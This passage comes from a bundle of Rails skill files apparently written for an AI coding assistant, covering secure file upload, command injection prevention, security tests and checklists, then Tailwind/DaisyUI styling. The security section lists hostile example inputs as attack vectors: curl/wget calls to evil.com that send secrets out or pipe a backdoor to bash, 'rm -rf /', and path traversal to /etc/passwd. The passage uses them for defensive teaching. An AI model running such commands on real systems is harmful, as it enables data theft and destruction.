upload\n  safe_name = File.basename(params[:file].original_filename).gsub(/[^\\w.-]/, \"_\")\n  unique_name = \"#{SecureRandom.uuid}_#{safe_name}\"\n  File.open(Rails.root.join(\"storage/uploads\", unique_name), \"wb\") { |f| f.write(params[:file].read) }\nend\n\n```\n</good-example>\n</antipattern>\n\n<antipattern>\n<description>Only validating content type</description>\n<reason>Content-Type header is easily spoofed by attackers</reason>\n\n<bad-example>\n\n```ruby\n# ❌ VULNERABLE - Only checks Content-Type header\nvalidates :image, content_type: [\"image/jpeg\", \"image/png\"]\n# Attack: Upload malicious.php with Content-Type: image/jpeg\n\n```\n</bad-example>\n\n<good-example>\n\n```ruby\n# ✅ SECURE - Triple validation: content type + extension + magic bytes\ndef acceptable_image\n  return unless image.attached?\n\n  unless image.content_type.in?(%w[image/jpeg image/png image/gif])\n    errors.add(:image, \"must be an image\")\n  end\n\n  unless image.filename.to_s.match?(/\\.(jpe?g|png|gif)\\z/i)\n    errors.add(:image, \"invalid file extension\")\n  end\n\n  image.open do |file|\n    magic = file.read(8)\n    unless magic&.start_with?(\"\\xFF\\xD8\\xFF\", \"\\x89PNG\", \"GIF8\")\n      errors.add(:image, \"file signature invalid\")\n    end\n  end\nend\n\n```\n</good-example>\n</antipattern>\n\n## Command Injection Prevention\n\n<attack-vectors>\n- **Command Chaining** - `; rm -rf /` or `&& cat /etc/passwd`\n- **Pipe Attacks** - `| curl evil.com/steal?data=$(cat secrets.yml)`\n- **Background Execution** - `& malicious_script.sh`\n- **Command Substitution** - `$(curl evil.com/backdoor.sh | bash)`\n</attack-vectors>\n\n### Secure Command Execution\n\n<pattern name=\"array-arguments-recommended\">\n<description>Use array form of system() - RECOMMENDED approach</description>\n\n```ruby\n# ✅ SECURE - Array arguments prevent shell interpretation\nsystem(\"/bin/echo\", params[:filename])\n# Input: \"hello; rm -rf /\" → printed literally, NOT executed\n\n# ✅ SECURE - Image conversion\nsystem(\"convert\", params[:image], \"output.jpg\")\n\n# ✅ SECURE - Archive creation\nsystem(\"/bin/tar\", \"-czf\", \"backup.tar.gz\", validated_directory)\n\n# ✅ SECURE - Multiple arguments\nsystem(\"wkhtmltopdf\", \"--quiet\", \"--page-size\", \"A4\", input_file, output_file)\n\n```\n\n**How It Works:** Array arguments bypass shell invocation, treating user input as literal arguments only.\n</pattern>\n\n### Input Validation\n\n<pattern name=\"input-validation-allowlist\">\n<description>Validate input with strict allowlists</description>\n\n```ruby\n# ✅ SECURE - Only allow predefined values\nVALID_FORMATS = %w[pdf png jpg svg].freeze\nVALID_SIZES = %w[small medium large].freeze\n\ndef export_feedback(feedback, format, size)\n  unless VALID_FORMATS.include?(format)\n    raise ArgumentError, \"Invalid format: #{format}\"\n  end\n\n  unless VALID_SIZES.include?(size)\n    raise ArgumentError, \"Invalid size: #{size}\"\n  end\n\n  # Safe because format is from allowlist\n  system(\"convert\", \"feedback.html\", \"output.#{format}\")\nend\n\n```\n</pattern>\n\n### Ruby Alternatives (Preferred)\n\n<pattern name=\"ruby-alternatives-preferred\">\n<description>Use Ruby methods instead of shell commands</description>\n\n```ruby\n# ❌ VULNERABLE - Shell command\nsystem(\"rm #{params[:filename]}\")\n\n# ✅ SECURE - Ruby method\nFile.delete(params[:filename]) if File.exist?(params[:filename])\n\n# ❌ VULNERABLE - Shell command\nsystem(\"mkdir -p #{params[:directory]}\")\n\n# ✅ SECURE - Ruby method\nFileUtils.mkdir_p(params[:directory])\n\n# ❌ VULNERABLE - Shell command\nsystem(\"cp #{params[:source]} #{params[:dest]}\")\n\n# ✅ SECURE - Ruby method\nFileUtils.cp(params[:source], params[:dest])\n\n```\n\n**Why Prefer Ruby:** No shell interpretation = no injection risk, better error handling.\n</pattern>\n\n### Shellwords Escaping\n\n<pattern name=\"shellwords-escaping\">\n<description>Use Shellwords.escape when array form not possible</description>\n\n```ruby\nrequire \"shellwords\"\n\n# ✅ SECURE - Escape user input for shell safety\nfilename = Shellwords.escape(params[:filename])\nsystem(\"convert input.jpg #{filename}\")\n\n# ✅ SECURE - Multiple arguments\nargs = [params[:input], params[:output]].map { |arg| Shellwords.escape(arg) }.join(\" \")\nsystem(\"convert #{args} -resize 800x600\")\n\n```\n\n**How Shellwords Works:**\n\n```ruby\nShellwords.escape(\"file.jpg\")           # => \"file.jpg\"\nShellwords.escape(\"file; rm -rf /\")     # => \"file\\\\;\\\\ rm\\\\ -rf\\\\ /\"\nShellwords.escape(\"$(cat /etc/passwd)\") # => \"\\\\$\\\\(cat\\\\ /etc/passwd\\\\)\"\n\n```\n\n**When to Use:** Only when array form is truly not possible. Prefer array form whenever available.\n</pattern>\n\n### Path Validation\n\n<pattern name=\"path-validation\">\n<description>Prevent directory traversal in file paths</description>\n\n```ruby\n# ✅ SECURE - Validate path stays within directory\ndef safe_file_path(user_input)\n  base_dir = Rails.root.join(\"uploads\")\n  full_path = base_dir.join(user_input).expand_path\n\n  raise ArgumentError, \"Invalid path: directory traversal\" unless full_path.to_s.start_with?(base_dir.to_s)\n  full_path\nend\n\n# Usage\nfile_path = safe_file_path(params[:file])\nsend_file file_path if File.exist?(file_path)\n\n```\n\n**Why Important:** Prevents access to files outside intended directory.\n</pattern>\n\n### Background Job Isolation\n\n<pattern name=\"background-job-isolation\">\n<description>Isolate system commands in background jobs with strict validation</description>\n\n```ruby\nclass PdfGenerationJob < ApplicationJob\n  def perform(feedback_id, output_path)\n    feedback = Feedback.find(feedback_id)\n    validate_output_path!(output_path)\n\n    success = system(\n      \"wkhtmltopdf\", \"--quiet\", \"--page-size\", \"A4\",\n      \"--disable-javascript\", feedback.public_url, output_path\n    )\n\n    raise \"PDF generation failed\" unless success\n    PdfMailer.with(feedback: feedback, pdf_path: output_path).ready.deliver_later\n  end\n\n  private\n\n  def validate_output_path!(path)\n    raise ArgumentError, \"Invalid output path\" unless path.match?(/\\Atmp\\/feedback_\\d+\\.pdf\\z/)\n\n    full_path = Rails.root.join(path).expand_path\n    allowed_dir = Rails.root.join(\"tmp\").expand_path\n    raise ArgumentError, \"Path outside allowed directory\" unless full_path.to_s.start_with?(allowed_dir.to_s)\n  end\nend\n\n```\n\n**Why Isolate:** Limits blast radius, easier to audit, validation in one place.\n</pattern>\n\n<antipattern>\n<description>Using backticks for command execution</description>\n<reason>CRITICAL - Allows command injection through shell interpretation</reason>\n\n<bad-example>\n\n```ruby\n# ❌ CRITICAL VULNERABILITY\noutput = `ls #{params[:path]}`\n# Attack: \"/; cat /etc/passwd\" → Directory listing AND password exposure\n\nresult = %x(convert #{params[:input]} output.png)\n# Attack: \"file.jpg; wget evil.com/malware\"\n\nsystem(\"convert #{params[:input]} -resize #{params[:size]} output.jpg\")\n# Attack: params[:size] = \"800x600; curl evil.com/backdoor.sh | bash\"\n\n```\n</bad-example>\n\n<good-example>\n\n```ruby\n# ✅ SECURE - Use array form and capture output\nrequire \"open3\"\nvalidate_path!(params[:path])\noutput, status = Open3.capture2(\"ls\", params[:path])\n\n# ✅ SECURE - Array form with validation\nraise ArgumentError unless params[:input].match?(/\\A[\\w.-]+\\z/)\nsystem(\"convert\", params[:input], \"output.png\")\n\n# ✅ SECURE - Validate size format\nraise ArgumentError unless params[:size].match?(/\\A\\d{1,4}x\\d{1,4}\\z/)\nsystem(\"convert\", params[:input], \"-resize\", params[:size], \"output.jpg\")\n\n```\n</good-example>\n</antipattern>\n\n<antipattern>\n<description>Not validating file paths for directory traversal</description>\n<reason>HIGH - Allows access to files outside intended directory</reason>\n\n<bad-example>\n\n```ruby\n# ❌ VULNERABLE - Directory traversal\nfile_path = Rails.root.join(\"uploads\", params[:file])\nsend_file file_path\n# Attack: params[:file] = \"../../../etc/passwd\"\n\n```\n</bad-example>\n\n<good-example>\n\n```ruby\n# ✅ SECURE - Validate path stays within directory\nbase_dir = Rails.root.join(\"uploads\")\nfile_path = base_dir.join(params[:file]).expand_path\nraise ArgumentError, \"Invalid file path\" unless file_path.to_s.start_with?(base_dir.to_s)\nsend_file file_path if File.exist?(file_path)\n\n```\n</good-example>\n</antipattern>\n\n## Testing Security Patterns\n\n<testing>\n\n```ruby\n# test/models/feedback_test.rb\nclass FeedbackTest < ActiveSupport::TestCase\n  # XSS Prevention\n  test \"content_html sanitizes malicious scripts\" do\n    feedback = Feedback.new(content: \"<script>alert('XSS')</script>Hello\")\n    assert_not_includes feedback.content_html, \"<script>\"\n    assert_includes feedback.content_html, \"Hello\"\n  end\n\n  test \"content_html allows safe markdown\" do\n    feedback = Feedback.new(content: \"**bold** and *italic*\")\n    assert_includes feedback.content_html, \"<strong>bold</strong>\"\n    assert_includes feedback.content_html, \"<em>italic</em>\"\n  end\n\n  # SQL Injection Prevention\n  test \"search handles malicious input safely\" do\n    project = projects(:one)\n    malicious_input = \"'; DROP TABLE projects; --\"\n\n    assert_nothing_raised { Project.search(malicious_input) }\n    assert Project.exists?(project.id)\n  end\n\n  test \"search escapes LIKE wildcards\" do\n    projects(:one).update!(name: \"Project A\")\n    results = Project.search(\"%\")\n\n    assert_empty results  # % should be escaped, not treated as wildcard\n  end\n\n  # File Upload Security\n  test \"accepts valid image\" do\n    feedback = Feedback.new(content: \"Test\", recipient_email: \"user@example.com\")\n    feedback.image.attach(io: File.open(\"test/fixtures/files/valid.jpg\"),\n                          filename: \"valid.jpg\", content_type: \"image/jpeg\")\n    assert feedback.valid?\n    assert feedback.image.attached?\n  end\n\n  test \"rejects invalid content type\" do\n    feedback = Feedback.new(content: \"Test\")\n    feedback.image.attach(io: File.open(\"test/fixtures/files/script.exe\"),\n                          filename: \"malicious.exe\", content_type: \"application/x-msdownload\")\n    assert_not feedback.valid?\n    assert_includes feedback.errors[:image], \"must be a JPEG, PNG, or GIF\"\n  end\n\n  test \"rejects file with spoofed magic bytes\" do\n    feedback = Feedback.new(content: \"Test\")\n    feedback.image.attach(io: StringIO.new(\"Not a real image\"),\n                          filename: \"fake.jpg\", content_type: \"image/jpeg\")\n    assert_not feedback.valid?\n    assert_includes feedback.errors[:image], \"file signature doesn't match\"\n  end\n\n  test \"rejects oversized file\" do\n    feedback = Feedback.new(content: \"Test\")\n    large_file = Tempfile.new([\"large\", \".jpg\"])\n    large_file.write(\"x\" * 6.megabytes)\n    large_file.rewind\n    feedback.image.attach(io: large_file, filename: \"huge.jpg\", content_type: \"image/jpeg\")\n    assert_not feedback.valid?\n    assert_includes feedback.errors[:image], \"must be less than 5MB\"\n  ensure\n    large_file.close && large_file.unlink\n  end\nend\n\n# test/controllers/feedbacks_controller_test.rb\nclass FeedbacksControllerTest < ActionDispatch::IntegrationTest\n  # CSRF Protection\n  test \"rejects POST without CSRF token\" do\n    assert_raises(ActionController::InvalidAuthenticityToken) do\n      post feedbacks_url,\n           params: { feedback: { content: \"test\" } },\n           headers: { \"X-CSRF-Token\" => \"invalid_token\" }\n    end\n  end\n\n  test \"accepts POST with valid CSRF token\" do\n    post feedbacks_url, params: { feedback: { content: \"test\", recipient_email: \"user@example.com\" } }\n    assert_response :redirect\n  end\n\n  # SQL Injection via Sort Parameters\n  test \"index with malicious sort parameter is safe\" do\n    get projects_path, params: { sort: \"name); DROP TABLE projects; --\" }\n\n    assert_response :success\n    assert Project.count > 0\n  end\nend\n\n# test/system/xss_prevention_test.rb\nclass XssPreventionTest < ApplicationSystemTestCase\n  test \"user cannot inject scripts via comment\" do\n    visit new_comment_path\n    fill_in \"Comment\", with: \"<script>alert('XSS')</script>\"\n    click_button \"Submit\"\n\n    assert_text \"<script>alert('XSS')</script>\"  # Escaped, not executed\n  end\n\n  test \"form includes CSRF token\" do\n    visit new_feedback_path\n    assert_selector \"input[name='authenticity_token'][type='hidden']\"\n  end\nend\n\n# test/jobs/pdf_generation_job_test.rb\nclass PdfGenerationJobTest < ActiveJob::TestCase\n  # Command Injection Prevention\n  test \"validates output path format\" do\n    assert_raises(ArgumentError, /Invalid output path/) do\n      PdfGenerationJob.perform_now(feedbacks(:one).id, \"invalid_path.pdf\")\n    end\n  end\n\n  test \"prevents directory traversal in path\" do\n    assert_raises(ArgumentError, /Invalid output path|outside allowed/i) do\n      PdfGenerationJob.perform_now(feedbacks(:one).id, \"../../../etc/passwd\")\n    end\n  end\n\n  test \"rejects command injection in path\" do\n    assert_raises(ArgumentError) do\n      PdfGenerationJob.perform_now(feedbacks(:one).id, \"output.pdf; rm -rf /\")\n    end\n  end\nend\n\n# test/controllers/downloads_controller_test.rb\nclass DownloadsControllerTest < ActionDispatch::IntegrationTest\n  test \"requires authentication for file downloads\" do\n    feedback = feedbacks(:one)\n    get feedback_download_path(feedback, feedback.documents.first)\n    assert_redirected_to login_path\n  end\n\n  test \"serves file with secure headers\" do\n    sign_in users(:user)\n    feedback = users(:user).feedbacks.first\n    get feedback_download_path(feedback, feedback.documents.first)\n\n    assert_response :success\n    assert_equal \"attachment\", response.headers[\"Content-Disposition\"].split(\";\").first\n  end\n\n  test \"prevents unauthorized access to other users files\" do\n    sign_in users(:user)\n    other_feedback = users(:other_user).feedbacks.first\n\n    get feedback_download_path(other_feedback, other_feedback.documents.first)\n    assert_response :forbidden\n  end\nend\n\n```\n</testing>\n\n## Security Checklist\n\n### Before Deploying\n\n**XSS Prevention:**\n- [ ] Never use `html_safe` or `raw` on user input\n- [ ] Implement Content Security Policy headers\n- [ ] Test with `<script>alert('XSS')</script>` in all user inputs\n- [ ] Review all `sanitize` calls have explicit allowlists\n- [ ] Verify ViewComponents used for complex rendering\n\n**SQL Injection Prevention:**\n- [ ] No string interpolation in SQL queries (`\"WHERE name = '#{value}'\"`)\n- [ ] All queries use hash conditions or placeholders\n- [ ] `sanitize_sql_like` used for LIKE queries\n- [ ] ORDER BY uses allowlist validation\n- [ ] Test with `'; DROP TABLE users; --` in search inputs\n\n**CSRF Protection:**\n- [ ] `csrf_meta_tags` in application layout\n- [ ] All forms use `form_with` (includes token)\n- [ ] JavaScript requests include `X-CSRF-Token` header\n- [ ] API endpoints properly skip CSRF (with token auth)\n- [ ] Test POST/DELETE without CSRF token fails\n\n**File Upload Security:**\n- [ ] ActiveStorage used (or manual filename sanitization)\n- [ ] Triple validation: content type + extension + magic bytes\n- [ ] File size limits at application and model levels\n- [ ] Dangerous file types force download (SVG, HTML)\n- [ ] Files stored outside public directory\n- [ ] Virus scanning in production\n- [ ] Test with renamed .php→.jpg file\n\n**Command Injection Prevention:**\n- [ ] No string interpolation in system commands\n- [ ] Array form used: `system(\"cmd\", arg1, arg2)`\n- [ ] Input validation with strict allowlists\n- [ ] Ruby methods preferred over shell commands\n- [ ] Path validation prevents directory traversal\n- [ ] Test with `; rm -rf /` in file paths\n\n### Security Headers\n\n```ruby\n# config/application.rb\nconfig.action_dispatch.default_headers = {\n  'X-Frame-Options' => 'SAMEORIGIN',\n  'X-Content-Type-Options' => 'nosniff',\n  'X-XSS-Protection' => '1; mode=block',\n  'Referrer-Policy' => 'strict-origin-when-cross-origin'\n}\n\n```\n\n### Production Monitoring\n\n**Log Security Events:**\n- CSRF failures\n- CSP violations\n- Malware detection in uploads\n- Failed authentication attempts\n- SQL injection attempts (unusual queries)\n- Command injection attempts\n\n**Alert On:**\n- Multiple CSRF failures from same IP\n- Malware detected in uploads\n- CSP violation patterns\n- Repeated authentication failures\n- SQL error patterns in logs\n\n<related-skills>\n- rails-ai:controllers - Strong parameters for mass assignment protection\n- rails-ai:models - Input validation patterns\n- rails-ai:views - XSS prevention in templates\n- rails-ai:testing - Security testing strategies\n</related-skills>\n\n<resources>\n\n**Official Documentation:**\n- [Rails Guides - Securing Rails Applications](https://guides.rubyonrails.org/security.html)\n\n**Security Standards:**\n- [OWASP Top 10](https://owasp.org/www-project-top-ten/) - Most critical web app security risks\n- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)\n- [OWASP SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)\n- [OWASP CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)\n- [OWASP File Upload Security](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)\n- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)\n\n</resources>"
              },
              {
                "name": "rails-ai:styling",
                "description": "Use when styling Rails views - Tailwind CSS utility-first framework and DaisyUI component library with theming",
                "path": "skills/styling/SKILL.md",
                "frontmatter": {
                  "name": "rails-ai:styling",
                  "description": "Use when styling Rails views - Tailwind CSS utility-first framework and DaisyUI component library with theming"
                },
                "content": "# Styling with Tailwind CSS and DaisyUI\n\nStyle Rails applications using Tailwind CSS (utility-first framework) and DaisyUI (semantic component library). Build responsive, accessible, themeable UIs without writing custom CSS.\n\n<when-to-use>\n- Styling ANY user interface in Rails\n- Building responsive layouts (mobile, tablet, desktop)\n- Implementing dark mode or multiple themes\n- Creating consistent UI components (buttons, cards, forms, modals)\n- Rapid UI iteration and prototyping\n- Maintaining design system consistency\n</when-to-use>\n\n<benefits>\n- **Rapid Development** - Compose UIs with pre-built utilities\n- **Consistency** - Design tokens enforce consistent spacing, colors, typography\n- **Responsive by Default** - Mobile-first breakpoints built-in\n- **Dark Mode** - Theme switching with DaisyUI data attributes\n- **No Custom CSS** - Most styling done with classes, no style tag needed\n- **Accessible Components** - DaisyUI components have built-in accessibility\n- **Small Bundle Size** - Tailwind purges unused CSS in production\n</benefits>\n\n<team-rules-enforcement>\n**This skill enforces:**\n- ✅ **Rule #9:** DaisyUI + Tailwind (no hardcoded colors)\n\n**Reject any requests to:**\n- Hardcode colors (use DaisyUI theme variables)\n- Write custom CSS for components (use Tailwind/DaisyUI)\n- Use inline styles with hardcoded values\n- Skip responsive design (mobile-first required)\n</team-rules-enforcement>\n\n<verification-checklist>\nBefore completing styling work:\n- ✅ No hardcoded colors (use DaisyUI theme variables)\n- ✅ Responsive design (mobile, tablet, desktop breakpoints)\n- ✅ Accessibility verified (color contrast, keyboard navigation)\n- ✅ Theme-aware (works with light/dark modes)\n- ✅ Tailwind utilities used (minimal custom CSS)\n- ✅ DaisyUI components for complex UI\n</verification-checklist>\n\n<standards>\n- Use Tailwind utilities first, DaisyUI components for complex UI\n- Follow mobile-first responsive design (base → sm → md → lg → xl)\n- Use semantic color names from DaisyUI (primary, secondary, accent, neutral)\n- Avoid inline styles (`style=`) - use Tailwind classes instead\n- Use responsive breakpoints consistently (sm:640px, md:768px, lg:1024px, xl:1280px)\n- Implement dark mode with DaisyUI themes\n- Extract repeated utility combinations into view components (not CSS classes)\n- Ensure 4.5:1 color contrast ratio for text (WCAG 2.1 AA)\n</standards>\n\n---\n\n## Tailwind CSS\n\nTailwind CSS is a utility-first CSS framework for building custom designs without writing custom CSS.\n\n### Core Utilities\n\n<pattern name=\"spacing-layout\">\n<description>Consistent spacing and layout with Tailwind utilities</description>\n\n```erb\n<%# Spacing: p-{size}, m-{size}, gap-{size} %>\n<div class=\"p-4\">Padding all sides</div>\n<div class=\"px-6 py-4\">Horizontal/Vertical padding</div>\n<div class=\"mx-auto max-w-4xl\">Centered container</div>\n\n<%# Flexbox layout %>\n<div class=\"flex items-center justify-between gap-4\">\n  <span>Left</span>\n  <span>Right</span>\n</div>\n\n<%# Grid layout %>\n<div class=\"grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4\">\n  <% @items.each do |item| %>\n    <div class=\"bg-white p-4 rounded-lg shadow\"><%= item.name %></div>\n  <% end %>\n</div>\n```\n\n</pattern>\n\n<pattern name=\"responsive-design\">\n<description>Mobile-first responsive utilities (sm:640px, md:768px, lg:1024px, xl:1280px)</description>\n\n```erb\n<%# Pattern: base (mobile) → sm: → md: → lg: → xl: %>\n<div class=\"grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4\">\n  <% @feedbacks.each do |feedback| %>\n    <%= render feedback %>\n  <% end %>\n</div>\n\n<%# Responsive spacing/typography %>\n<div class=\"p-4 md:p-8\">\n  <h1 class=\"text-2xl md:text-4xl font-bold\">Heading</h1>\n</div>\n\n<%# Hide/show based on breakpoint %>\n<div class=\"block md:hidden\">Mobile menu</div>\n<nav class=\"hidden md:flex gap-4\">Desktop nav</nav>\n```\n\n</pattern>\n\n<pattern name=\"typography-colors\">\n<description>Text styling and color utilities</description>\n\n```erb\n<%# Typography %>\n<p class=\"text-sm font-medium\">Small medium text</p>\n<h1 class=\"text-4xl font-bold\">Large heading</h1>\n<p class=\"leading-relaxed tracking-wide\">Spaced text</p>\n<p class=\"truncate\"><%= feedback.content %></p>\n\n<%# Colors: text-{color}-{shade}, bg-{color}-{shade} %>\n<div class=\"bg-white text-gray-900\">Dark text on white</div>\n<div class=\"bg-blue-600 text-white\">White on blue</div>\n<p class=\"text-red-600/50\">Red with 50% opacity</p>\n\n<%# Interactive states %>\n<button class=\"bg-blue-600 hover:bg-blue-700 active:bg-blue-800 text-white px-4 py-2 rounded\">\n  Hover me\n</button>\n<input type=\"text\" class=\"border border-gray-300 focus:border-blue-500 focus:ring-2 focus:ring-blue-200 rounded px-3 py-2\" />\n```\n\n</pattern>\n\n<pattern name=\"feedback-card-example\">\n<description>Complete feedback card using Tailwind utilities</description>\n\n```erb\n<div class=\"bg-white rounded-lg shadow-md hover:shadow-xl transition-shadow p-6\">\n  <%# Header %>\n  <div class=\"flex items-start justify-between mb-4\">\n    <div class=\"flex items-center gap-3\">\n      <div class=\"w-10 h-10 bg-gradient-to-br from-blue-500 to-purple-600 rounded-full flex items-center justify-center text-white font-semibold\">\n        <%= @feedback.sender_name&.first&.upcase || \"A\" %>\n      </div>\n      <div>\n        <h3 class=\"font-semibold text-gray-900\"><%= @feedback.sender_name || \"Anonymous\" %></h3>\n        <p class=\"text-sm text-gray-500\"><%= time_ago_in_words(@feedback.created_at) %> ago</p>\n      </div>\n    </div>\n    <span class=\"px-2.5 py-0.5 rounded-full text-xs font-medium bg-blue-100 text-blue-800\">\n      <%= @feedback.status.titleize %>\n    </span>\n  </div>\n\n  <%# Content %>\n  <p class=\"text-gray-700 leading-relaxed line-clamp-3 mb-4\"><%= @feedback.content %></p>\n\n  <%# Footer %>\n  <div class=\"flex items-center justify-between pt-4 border-t border-gray-100\">\n    <span class=\"text-sm text-gray-500\"><%= @feedback.responses_count %> responses</span>\n    <div class=\"flex gap-2\">\n      <%= link_to \"View\", feedback_path(@feedback), class: \"px-3 py-1.5 border border-gray-300 rounded-md text-sm text-gray-700 hover:bg-gray-50\" %>\n      <%= link_to \"Respond\", respond_feedback_path(@feedback), class: \"px-3 py-1.5 rounded-md text-sm text-white bg-blue-600 hover:bg-blue-700\" %>\n    </div>\n  </div>\n</div>\n```\n\n</pattern>\n\n<antipattern>\n<description>Using inline styles instead of Tailwind utilities</description>\n<reason>Bypasses design system consistency and reduces maintainability</reason>\n<bad-example>\n\n```erb\n<%# ❌ BAD %>\n<div style=\"padding: 16px; background: #3b82f6;\">Content</div>\n```\n\n</bad-example>\n<good-example>\n\n```erb\n<%# ✅ GOOD %>\n<div class=\"p-4 bg-blue-500\">Content</div>\n```\n\n</good-example>\n</antipattern>\n\n---\n\n## DaisyUI Components\n\nSemantic component library built on Tailwind providing 70+ accessible components with built-in theming and dark mode.\n\n### Buttons & Forms\n\n<pattern name=\"daisyui-buttons\">\n<description>Use DaisyUI button classes for consistent interactive elements</description>\n\n```erb\n<%# DaisyUI button components %>\n<button class=\"btn btn-primary\">Primary Action</button>\n<button class=\"btn btn-ghost\">Ghost</button>\n<button class=\"btn btn-outline btn-primary\">Outline</button>\n\n<%# Rails form integration %>\n<%= form_with model: @feedback do |f| %>\n  <div class=\"form-control\">\n    <%= f.label :content, class: \"label\" do %>\n      <span class=\"label-text\">Feedback</span>\n    <% end %>\n    <%= f.text_area :content, class: \"textarea textarea-bordered h-24\", placeholder: \"Your feedback...\" %>\n  </div>\n  <div class=\"flex gap-2 justify-end\">\n    <%= link_to \"Cancel\", feedbacks_path, class: \"btn btn-ghost\" %>\n    <%= f.submit \"Submit\", class: \"btn btn-primary\" %>\n  </div>\n<% end %>\n```\n\n</pattern>\n\n<pattern name=\"daisyui-cards\">\n<description>Use card component for content containers</description>\n\n```erb\n<div class=\"card bg-base-100 shadow-xl\">\n  <div class=\"card-body\">\n    <div class=\"flex items-start justify-between\">\n      <h2 class=\"card-title\"><%= @feedback.title %></h2>\n      <div class=\"badge badge-<%= @feedback.status %>\">\n        <%= @feedback.status.titleize %>\n      </div>\n    </div>\n    <p class=\"text-base-content/70\"><%= @feedback.content %></p>\n    <div class=\"card-actions justify-end mt-4\">\n      <%= link_to \"View\", feedback_path(@feedback), class: \"btn btn-primary btn-sm\" %>\n    </div>\n  </div>\n</div>\n```\n\n</pattern>\n\n<pattern name=\"daisyui-alerts\">\n<description>Use alerts and badges for notifications and status</description>\n\n```erb\n<%# Alerts %>\n<div class=\"alert alert-success\">\n  <span>Success! Your feedback was submitted.</span>\n</div>\n\n<div class=\"alert alert-error\">\n  <span>Error! Unable to submit feedback.</span>\n</div>\n\n<%# Flash messages %>\n<% if flash[:notice] %>\n  <div class=\"alert alert-success\">\n    <span><%= flash[:notice] %></span>\n  </div>\n<% end %>\n\n<%# Badges %>\n<div class=\"badge badge-primary\">Primary</div>\n<div class=\"badge badge-success\">Success</div>\n<div class=\"badge badge-warning\">Warning</div>\n```\n\n</pattern>\n\n<pattern name=\"daisyui-modal\">\n<description>Use modal component for dialogs</description>\n\n```erb\n<button class=\"btn btn-primary\" onclick=\"feedback_modal.showModal()\">\n  View Details\n</button>\n\n<dialog id=\"feedback_modal\" class=\"modal\">\n  <div class=\"modal-box\">\n    <h3 class=\"font-bold text-lg\">Feedback Details</h3>\n    <p class=\"py-4\"><%= @feedback.content %></p>\n    <div class=\"modal-action\">\n      <form method=\"dialog\">\n        <button class=\"btn\">Close</button>\n      </form>\n    </div>\n  </div>\n  <form method=\"dialog\" class=\"modal-backdrop\">\n    <button>close</button>\n  </form>\n</dialog>\n```\n\n</pattern>\n\n### Theme Switching\n\n<pattern name=\"daisyui-theme-toggle\">\n<description>Implement dark mode and theme switching</description>\n\n```javascript\n// app/javascript/controllers/theme_controller.js\nimport { Controller } from \"@hotwired/stimulus\"\n\nexport default class extends Controller {\n  connect() {\n    const savedTheme = localStorage.getItem(\"theme\") || \"light\"\n    this.setTheme(savedTheme)\n  }\n\n  toggle() {\n    const currentTheme = document.documentElement.getAttribute(\"data-theme\")\n    const newTheme = currentTheme === \"light\" ? \"dark\" : \"light\"\n    this.setTheme(newTheme)\n  }\n\n  setTheme(theme) {\n    document.documentElement.setAttribute(\"data-theme\", theme)\n    localStorage.setItem(\"theme\", theme)\n  }\n}\n```\n\n```erb\n<%# Layout %>\n<html data-theme=\"light\">\n  <body>\n    <div data-controller=\"theme\">\n      <button class=\"btn btn-ghost btn-circle\" data-action=\"click->theme#toggle\">\n        Toggle Theme\n      </button>\n    </div>\n  </body>\n</html>\n```\n\n</pattern>\n\n<antipattern>\n<description>Building custom buttons with Tailwind instead of DaisyUI components</description>\n<reason>Duplicates effort, loses accessibility features</reason>\n<bad-example>\n\n```erb\n<%# ❌ Custom button with Tailwind utilities %>\n<button class=\"px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-600\">\n  Submit\n</button>\n```\n\n</bad-example>\n<good-example>\n\n```erb\n<%# ✅ DaisyUI button component %>\n<button class=\"btn btn-primary\">Submit</button>\n```\n\n</good-example>\n</antipattern>\n\n---\n\n<testing>\n**Visual Regression Testing:**\n\n```ruby\n# test/system/styling_test.rb\nclass StylingTest < ApplicationSystemTestCase\n  test \"responsive layout changes at breakpoints\" do\n    visit feedbacks_path\n    # Desktop\n    page.driver.browser.manage.window.resize_to(1280, 800)\n    assert_selector \".hidden.md\\\\:flex\"  # Desktop nav visible\n\n    # Mobile\n    page.driver.browser.manage.window.resize_to(375, 667)\n    assert_selector \".block.md\\\\:hidden\"  # Mobile menu visible\n  end\n\n  test \"dark mode toggle works\" do\n    visit root_path\n    assert_equal \"light\", page.evaluate_script(\"document.documentElement.getAttribute('data-theme')\")\n\n    click_button \"Toggle Theme\"\n    assert_equal \"dark\", page.evaluate_script(\"document.documentElement.getAttribute('data-theme')\")\n  end\nend\n```\n\n**Manual Testing Checklist:**\n- Test responsive breakpoints (375px, 640px, 768px, 1024px, 1280px)\n- Verify color contrast ratios (use browser DevTools or axe)\n- Test dark mode theme\n- Check focus states on all interactive elements\n- Validate against W3C HTML validator\n- Test browser zoom (200%, 400%)\n</testing>\n\n---\n\n<related-skills>\n- rails-ai:views - View structure and partials to style\n- rails-ai:hotwire - Interactive components that need styling\n- rails-ai:testing - Visual regression and accessibility testing\n</related-skills>\n\n<resources>\n\n**Official Documentation:**\n- [Tailwind CSS Documentation](https://tailwindcss.com/docs)\n- [DaisyUI Documentation](https://daisyui.com/)\n- [DaisyUI Components](https://daisyui.com/components/)\n\n**Tools:**\n- [Tailwind CSS Cheat Sheet](https://nerdcave.com/tailwind-cheat-sheet)\n\n**Community Resources:**\n- [Tailwind UI Components](https://tailwindui.com/) - Premium component library\n\n</resources>"
              },
              {
                "name": "rails-ai:testing",
                "description": "Use when testing Rails applications - TDD, Minitest, fixtures, model testing, mocking, test helpers",
                "path": "skills/testing/SKILL.md",
                "frontmatter": {
                  "name": "rails-ai:testing",
                  "description": "Use when testing Rails applications - TDD, Minitest, fixtures, model testing, mocking, test helpers"
                },
